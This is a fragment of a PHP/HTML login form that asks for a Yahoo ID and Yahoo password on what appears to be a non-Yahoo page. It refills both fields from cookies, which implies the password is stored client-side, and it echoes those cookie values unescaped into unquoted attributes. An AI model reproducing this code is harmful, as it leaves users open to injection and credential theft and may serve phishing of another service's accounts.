            ...
            <div class="form-login-down">
                ...
                <form method="POST" action="">
                    <div class="form-group">
                        ...
                        <input class="form-control" type="text" name="yahoo_id"
                            value=<?php echo isset($_COOKIE["yahoo_id"]) ? $_COOKIE["yahoo_id"] : ""?>>
                        <p>(e.g. free2rhyme@yahoo.com)</p>
                    </div>
                    <div class="form-group mb-3">
                        <label for="">Password</label>
                        <input class="form-control" type="password" name="yahoo_password"
                            value=<?php echo isset($_COOKIE["yahoo_password"]) ? $_COOKIE["yahoo_password"] : ""?>>
                    </div>
                    <div>
